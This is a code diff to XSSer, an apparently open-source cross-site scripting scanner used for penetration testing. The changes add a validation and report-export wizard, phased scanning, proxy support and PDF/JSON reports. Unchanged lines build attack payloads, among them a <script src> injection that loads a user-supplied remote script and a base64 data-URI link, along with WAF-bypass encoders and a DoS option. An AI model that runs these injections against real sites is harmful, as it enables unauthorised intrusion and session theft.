                 ans5 = None
@@ -2745,6 +2893,65 @@ class xsser(EncoderDecoder, XSSerReporter):
             elif (ans5 == "e" or ans5 == "E"):
                 print("Closing wizard...")
                 ans5=None
+                ansV=None
+                ansR=None
+                ans6=None
+            else:
+                print("\nNot valid choice. Try again!")
+
+        #step F: Validation (reverse-check)
+        while ansV:
+            print(22*"-")
+            print("""\nF)- Do you want to confirm each vulnerability is 100% real? (no false positives!)\n
+            *[1]- Yes!. Validate opening a reverse connection (a headless browser will confirm each finding).
+             [2]- No. A normal check is enough for me.
+             [e]- Exit/Quit.
+            """)
+            ansV = input("Your choice: [1], [2] or [e]xit (or just press [ENTER] for the default *)\n")
+            if ansV == "":
+                ansV = "1"
+            if ansV == "1":
+                validate = "reverse-check"
+                ansV = None
+            elif ansV == "2":
+                validate = "normal-check"
+                ansV = None
+            elif (ansV == "e" or ansV == "E"):
+                print("Closing wizard...")
+                ansV=None
+                ansR=None
+                ans6=None
+            else:
+                print("\nNot valid choice. Try again!")
+
+        #step G: Report
+        while ansR:
+            print(22*"-")
+            print("""\nG)- Do you want to export a report with the results?\n
+            *[1]- Yes. Generate a professional PDF report.
+             [2]- Yes. Export the results to XML.
+             [3]- Yes. Save the results to a raw text file.
+             [4]- No. I just want to see the results on screen.
+             [e]- Exit/Quit.
+            """)
+            ansR = input("Your choice: [1], [2], [3], [4] or [e]xit (or just press [ENTER] for the default *)\n")
+            if ansR == "":
+                ansR = "1"
+            if ansR == "1":
+                report = "PDF"
+                ansR = None
+            elif ansR == "2":
+                report = "XML"
+                ansR = None
+            elif ansR == "3":
+                report = "RAW"
+                ansR = None
+            elif ansR == "4":
+                report = "None"
+                ansR = None
+            elif (ansR == "e" or ansR == "E"):
+                print("Closing wizard...")
+                ansR=None
                 ans6=None
             else:
                 print("\nNot valid choice. Try again!")
@@ -2758,6 +2965,8 @@ class xsser(EncoderDecoder, XSSerReporter):
             print("C)- Privacy:", proxy)
             print("D)- Bypasser(s):", enc)
             print("E)- Final:", script)
+            print("F)- Validation:", validate)
+            print("G)- Report:", report)
             print("""
             [Y]- Yes. Accept it and start testing!.
             [N]- No. Abort it?.
@@ -2774,7 +2983,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             else:
                 print("\nNot valid choice. Try again!")
             if url and payload and proxy and enc and script:
-                return url, payload, proxy, enc, script
+                return url, payload, proxy, enc, script, validate, report
             else:
                 return
 
@@ -2789,16 +2998,26 @@ class xsser(EncoderDecoder, XSSerReporter):
         image_injections = image_xss_injections.image_xss(options.imx , options.script)
         return image_injections
 
-    def create_fake_flash(self, filename, payload):
-        """
-        Create -fake- flash movie (.swf) with code injected
-    	"""
-        options = self.options
-        filename = options.flash
-        payload = options.script
-        flash_xss_injections = FlashInjections()
-        flash_injections = flash_xss_injections.flash_xss(options.flash, options.script)
-        return flash_injections
+    def set_attack_phase(self, phase):
+        inj = self._phase_inject_flags
+        if phase == 'hash':
+            self.options.hash = True
+            self.options.heuristic = False
+            self.options.reversecheck = False
+            for k in inj:
+                setattr(self.options, k, False)
+        elif phase == 'heuristic':
+            self.options.heuristic = True
+            self.options.hash = False
+            self.options.reversecheck = False
+            for k in inj:
+                setattr(self.options, k, False)
+        else:
+            self.options.hash = False
+            self.options.heuristic = False
+            self.options.reversecheck = self._phase_reversecheck
+            for k, v in inj.items():
+                setattr(self.options, k, v)
 
     def create_gtk_interface(self):
         """
@@ -2837,26 +3056,11 @@ class xsser(EncoderDecoder, XSSerReporter):
 
         options = self.options
         if options:
-            if self.options.hash is True: # not fuzzing/heuristic when hash precheck
-                self.options.fuzz = False
-                self.options.script = False
-                self.options.coo = False
-                self.options.xsa = False
-                self.options.xsr = False
-                self.options.dcp = False
-                self.options.dom = False
-                self.options.inducedcode = False
-                self.options.heuristic = False
-            if self.options.heuristic: # not fuzzing/hash when heuristic precheck
-                self.options.fuzz = False
-                self.options.script = False
-                self.options.coo = False
-                self.options.xsa = False
-                self.options.xsr = False
-                self.options.dcp = False
-                self.options.dom = False
-                self.options.inducedcode = False
-                self.options.hash = False
+            self._phase_hash = bool(self.options.hash)
+            self._phase_heuristic = bool(self.options.heuristic)
+            self._phase_reversecheck = bool(self.options.reversecheck)
+            self._phase_inject_flags = {'fuzz': self.options.fuzz, 'script': self.options.script, 'coo': self.options.coo, 'xsa': self.options.xsa, 'xsr': self.options.xsr, 'dcp': self.options.dcp, 'dom': self.options.dom, 'inducedcode': self.options.inducedcode}
+            self._phase_inject = any(self._phase_inject_flags.values()) or (not self._phase_hash and not self._phase_heuristic)
             if self.options.Cem: # parse input at CEM for blank spaces
                 self.options.Cem = self.options.Cem.replace(" ","")
         else:
@@ -2873,16 +3077,6 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.report('='*75 + "\n")
         except:
             return
-
-        if options.flash: # create -fake- flash movie (.swf) with code injected
-            p = self.optionParser
-            self.report('='*75)
-            self.report(str(p.version))
-            self.report('='*75)
-            self.report("[Flash Attack! XSS Builder]...")
-            self.report('='*75)
-            self.report(''.join(self.create_fake_flash(self.options.flash, self.options.script)))
-            self.report('='*75 + "\n")
 
         if options.xsser_gtk:
             self.create_gtk_interface()
@@ -2939,8 +3133,12 @@ class xsser(EncoderDecoder, XSSerReporter):
             print("-"*25+"\n")
             headers = {'User-Agent' : agent, 'Referer' : referer} # set fake user-agent and referer
             try:
+                if options.proxy:
+                    proxy_handler = urllib.request.ProxyHandler({'http': options.proxy, 'https': options.proxy})
+                    opener = urllib.request.build_opener(proxy_handler)
+                    urllib.request.install_opener(opener)
                 req = urllib.request.Request(url, None, headers)
-                tor_reply = urllib.request.urlopen(req).read().decode('utf-8')
+                tor_reply = urllib.request.urlopen(req, timeout=30).read().decode('utf-8')
                 your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                 if not tor_reply or 'Congratulations' not in tor_reply:
                     print("It seems that Tor is not properly set.\n")
@@ -2968,42 +3166,57 @@ class xsser(EncoderDecoder, XSSerReporter):
         for reporter in self._reporters:
             reporter.report_state('arming')
         
-        # step 2: get payloads
-        payloads = self.try_running(self.get_payloads, "\n[Error] WARNING: Some internal errors getting -payloads-\n")
-        for reporter in self._reporters:
-            reporter.report_state('cloaking')
-        if options.Dwo:
-            payloads = self.process_payloads_ipfuzzing(payloads)
-        elif options.Doo:
-            payloads = self.process_payloads_ipfuzzing_octal(payloads)
-        for reporter in self._reporters:
-            reporter.report_state('locking targets')
-
         # step 3: get query string
         query_string = self.try_running(self.get_query_string, "\n[Error] WARNING: Some internal problems getting query -string-\n")
         for reporter in self._reporters:
             reporter.report_state('sanitize')
         urls = self.sanitize_urls(urls)
-        for reporter in self._reporters:
-            reporter.report_state('attack')
+
+        phases = []
+        if self._phase_hash:
+            phases.append('hash')
+        if self._phase_heuristic:
+            phases.append('heuristic')
+        if self._phase_inject:
+            phases.append('inject')
+        if not phases:
+            phases.append('inject')
 
         # step 4: perform attack
-        self.try_running(self.attack, "\n[Error] WARNING: Some internal problems running attack...\n", (urls, payloads, query_string))
-        for reporter in self._reporters:
-            reporter.report_state('reporting')
-        if len(self.final_attacks):
-            self.report("[Info] Waiting for tokens to arrive...")
-        while self._ongoing_requests and not self._landing:
-            if not self.pool:
-                self.mothership.poll_workers()
-            else:
-                self.poll_workers()
-            time.sleep(0.2)
+        for phase in phases:
+            if self._landing:
+                break
+            self.set_attack_phase(phase)
+            payloads = self.try_running(self.get_payloads, "\n[Error] WARNING: Some internal errors getting -payloads-\n")
             for reporter in self._reporters:
-                reporter.report_state('final sweep...')
+                reporter.report_state('cloaking')
+            if options.Dwo:
+                payloads = self.process_payloads_ipfuzzing(payloads)
+            elif options.Doo:
+                payloads = self.process_payloads_ipfuzzing_octal(payloads)
+            for reporter in self._reporters:
+                reporter.report_state('attack')
+            self.try_running(self.attack, "\n[Error] WARNING: Some internal problems running attack...\n", (urls, payloads, query_string))
+            for reporter in self._reporters:
+                reporter.report_state('reporting')
+            if len(self.final_attacks):
+                self.report("[Info] Waiting for tokens to arrive...")
+            while self._ongoing_requests and not self._landing:
+                if not self.pool:
+                    self.mothership.poll_workers()
+                else:
+                    self.poll_workers()
+                time.sleep(0.2)
+                for reporter in self._reporters:
+                    reporter.report_state('final sweep...')
         if self.pool:
             self.pool.dismissWorkers(len(self.pool.workers))
             self.pool.joinAllDismissedWorkers()
+        self.options.hash = self._phase_hash
+        self.options.heuristic = self._phase_heuristic
+        self.options.reversecheck = self._phase_reversecheck
+        for k, v in self._phase_inject_flags.items():
+            setattr(self.options, k, v)
         start = time.time()
         while not self._landing and len(self.final_attacks) and time.time() - start < 5.0:
             time.sleep(0.2)
@@ -3084,6 +3297,13 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def land(self, join=False):
         self._landing = True
+        if self.pool:
+            try:
+                while True:
+                    self.pool._requests_queue.get_nowait()
+            except:
+                pass
+            self.pool.dismissWorkers(len(self.pool.workers))
         if self.hub:
             self.hub.shutdown()
             if join:
@@ -3160,7 +3380,7 @@ class xsser(EncoderDecoder, XSSerReporter):
         elif self.options.finalremote:
             user_attack_payload = '<script src="' + self.options.finalremote + '"></script>'
         elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Data Control Protocol Injection]":
-            user_attack_payload = '<a href="data:text/html;base64,' + b64encode(self.options.finalpayload) + '></a>'
+            user_attack_payload = '<a href="data:text/html;base64,' + b64e(self.options.finalpayload) + '></a>'
         elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Induced Injection]":
             user_attack_payload = self.options.finalpayload
         if self.options.dos:
@@ -3210,10 +3430,96 @@ class xsser(EncoderDecoder, XSSerReporter):
         for reporter in self._reporters:
             reporter.post(formatted)
 
+    def xsser_reports_dir(self, filename):
+        filename = str(filename)
+        if os.path.dirname(filename):
+            return filename
+        d = "reports"
+        try:
+            if not os.path.exists(d):
+                os.makedirs(d)
+        except:
+            return filename
+        return os.path.join(d, filename)
+
+    def get_command_used(self):
+        return "xsser " + " ".join(sys.argv[1:])
+
+    def get_techniques_used(self):
+        o = self.options
+        t = []
+        if o.getdata:
+            t.append("GET parameter injection")
+        if o.postdata:
+            t.append("POST parameter injection")
+        if o.crawling:
+            t.append("Crawler / spidering")
+        if o.dork:
+            t.append("Dorking (search engines)")
+        if o.nohead:
+            t.append("HEAD pre-check")
+        if o.hash:
+            t.append("Hashing check (reflection precheck)")
+        if o.heuristic:
+            t.append("Heuristic parameter analysis")
+        if o.discode:
+            t.append("Code discovery (--discode)")
+        if o.reversecheck:
+            t.append("Reverse-check (headless validation)")
+        if o.fuzz:
+            t.append("Auto payload fuzzing")
+        if o.script:
+            t.append("Manual payload")
+        if o.dcp:
+            t.append("DCP - Data Control Protocol injection")
+        if o.dom:
+            t.append("DOM - Document Object Model injection")
+        if o.inducedcode:
+            t.append("Induced injection (HTTP Response Splitting)")
+        if o.xsa:
+            t.append("XSA - Cross Site Agent injection")
+        if o.xsr:
+            t.append("XSR - Cross Site Referer injection")
+        if o.coo:
+            t.append("COO - Cross Site Cookie injection")
+        if o.anchor:
+            t.append("Anchor stealth (DOM)")
+        if o.b64:
+            t.append("Base64 (DCP) encoding")
+        if o.ifr:
+            t.append("IFRAME injection")
+        if o.onm:
+            t.append("onMouseMove injection")
+        encoders = []
+        for a, n in (("Str", "String.fromCharCode()"), ("Une", "Unescape()"), ("Mix", "Mix (fromCharCode+Unescape)"), ("Dec", "Decimal"), ("Hex", "Hexadecimal"), ("Hes", "Hexadecimal+semicolons"), ("Dwo", "DWORD IP"), ("Doo", "Octal IP"), ("Dou", "Double URL"), ("Ent", "HTML entities"), ("Cas", "Mixed-Case"), ("Uni", "JS Unicode"), ("Xhx", "JS Hexadecimal"), ("Ocb", "JS Octal")):
+            if getattr(o, a, None):
+                encoders.append(n)
+        if o.Cem:
+            encoders.append("CEM: " + str(o.Cem))
+        if encoders:
+            t.append("Encoders / obfuscators: " + ", ".join(encoders))
+        wafs = []
+        for a, n in (("cloudflare", "Cloudflare"), ("akamai", "Akamai"), ("awswaf", "AWS WAF"), ("azure", "Azure"), ("imperva", "Imperva"), ("f5bigip", "F5 BIG-IP"), ("barracuda", "Barracuda"), ("modsec", "ModSecurity"), ("wordfence", "Wordfence"), ("sucuri", "Sucuri"), ("fortiweb", "FortiWeb"), ("webknight", "WebKnight")):
+            if getattr(o, a, None):
+                wafs.append(n)
+        if wafs:
+            t.append("Anti-antiXSS / WAF-IDS bypassers: " + ", ".join(wafs))
+        if o.proxy:
+            t.append("Proxy")
+        if getattr(o, 'checktor', None):
+            t.append("Tor")
+        return t
+
     def print_results(self):
         """
         Print results from attack.
         """
+        if self.options.filexml:
+            self.options.filexml = self.xsser_reports_dir(self.options.filexml)
+        if self.options.filepdf:
+            self.options.filepdf = self.xsser_reports_dir(self.options.filepdf)
+        if self.options.filejson:
+            self.options.filejson = self.xsser_reports_dir(self.options.filejson)
         self.report('='*75)
         total_injections = len(self.hash_found) + len(self.hash_notfound)
         if len(self.hash_found) + len(self.hash_notfound) == 0:
@@ -3253,9 +3559,21 @@ class xsser(EncoderDecoder, XSSerReporter):
                         self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] possible XSS vector! ;-)\n")
                 self.report("---------------------" + "\n")
         if self.options.fileoutput:
-            fout = open("XSSreport.raw", "w") # write better than append
+            fout = open(self.xsser_reports_dir("XSSreport.raw"), "w") # write better than append
+            fout.write("="*75 + "\n")
+            fout.write("XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
+            fout.write("="*75 + "\n\n")
+            fout.write("[+] Command:\n\n " + self.get_command_used() + "\n\n")
+            report_techniques = self.get_techniques_used()
+            if report_techniques:
+                fout.write("[+] Techniques used:\n\n")
+                for report_technique in report_techniques:
+                    fout.write("   - " + report_technique + "\n")
+                fout.write("\n")
+            fout.write("[+] Targets: " + str(len(self.successful_urls)) + " | Injections: " + str(len(self.hash_found) + len(self.hash_notfound)) + " | Successful: " + str(len(self.hash_found)) + "\n\n")
+            fout.write("="*75 + "\n\n")
         for line in self.hash_found:
-            if self.options.heuristic or self.options.hash: # not final attack possible when checking
+            if line[1] == "[hashing check]" or line[1] == "[Heuristic test]":
                 pass
             else:
                 attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
@@ -3513,17 +3831,17 @@ class xsser(EncoderDecoder, XSSerReporter):
                         self.report("[+] Target:", line[6])
                     self.report("[+] Vector: [ " + str(line[3]) + " ]")
                     self.report("[!] Method:", line[2])
-                    self.report("[*] Payload:", line[5])
-                    self.report("[!] Status: NOT FILTERED!",  "\n", '-'*50, "\n")
+                    self.report("[*] Character tested:", line[5])
+                    self.report("[!] Status: NOT FILTERED! (passes through to the target)",  "\n", '-'*50, "\n")
                 if self.options.fileoutput:
                     fout.write("="*75)
                     fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                     fout.write("="*75 + "\n\n")
                     for line in self.hash_found:
                         if line[4]:
-                            fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Payload: \n\n " + str(line[5]) + "\n\n[!] Status: NOT FILTERED!\n\n")
+                            fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Character tested: " + str(line[5]) + "\n\n[!] Status: NOT FILTERED! (passes through to the target)\n\n")
                         else:
-                            fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Payload: \n\n " + str(line[5]) + "\n\n[!] Status: NOT FILTERED!\n\n")
+                            fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Character tested: " + str(line[5]) + "\n\n[!] Status: NOT FILTERED! (passes through to the target)\n\n")
                         fout.write("="*75 + "\n\n")
             else:
                 self.auto_found = self.auto_found + 1
@@ -3589,16 +3907,16 @@ class xsser(EncoderDecoder, XSSerReporter):
         if self.options.fileoutput:
             fout.close()
         if self.options.fileoutput and not self.options.filexml:
-           self.report("\n[Info] Generating report: [ XSSreport.raw ]\n")
+           self.report("\n[Info] Generating report: [ reports/XSSreport.raw ]\n")
            self.report("-"*25+"\n")
         if self.options.fileoutput and self.options.filexml:
-           self.report("\n[Info] Generating report: [ XSSreport.raw ] | Exporting results to: [ " + str(self.options.filexml) + " ] \n")
+           self.report("\n[Info] Generating report: [ reports/XSSreport.raw ] | Exporting results to: [ " + str(self.options.filexml) + " ] \n")
            self.report("-"*25+"\n")
         if len(self.hash_found) > 10 and not self.options.fileoutput: # write results fo file when large output (white magic!)
             if not self.options.filexml: 
-                self.report("[Info] Aborting large screen output. Generating auto-report at: [ XSSreport.raw ] ;-)\n")
+                self.report("[Info] Aborting large screen output. Generating auto-report at: [ reports/XSSreport.raw ] ;-)\n")
                 self.report("-"*25+"\n")
-                fout = open("XSSreport.raw", "w") # write better than append
+                fout = open(self.xsser_reports_dir("XSSreport.raw"), "w") # write better than append
                 fout.write("="*75)
                 fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                 fout.write("="*75 + "\n\n")
@@ -3832,7 +4150,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                     if self.options.statistics:
                         self.report('='*75 + '\n')
             if self.options.fileoutput:
-                fout = open("XSSreport.raw", "w") # write better than append
+                fout = open(self.xsser_reports_dir("XSSreport.raw"), "w") # write better than append
                 fout.write("="*75)
                 fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                 fout.write("="*75 + "\n\n")
@@ -3884,7 +4202,25 @@ class xsser(EncoderDecoder, XSSerReporter):
             try:
                 xml_report_results.print_xml_results(self.options.filexml)
             except:
-                return
+                pass
+
+        # print results to pdf file
+        if self.options.filepdf:
+            from core.post.pdf_exporter import pdf_reporting
+            pdf_report_results = pdf_reporting(self)
+            try:
+                pdf_report_results.print_pdf_results(self.options.filepdf)
+            except:
+                pass
+
+        # print results to json file
+        if self.options.filejson:
+            from core.post.json_exporter import json_reporting
+            json_report_results = json_reporting(self)
+            try:
+                json_report_results.print_json_results(self.options.filejson)
+            except:
+                pass
 
 if __name__ == "__main__":
     app = xsser()
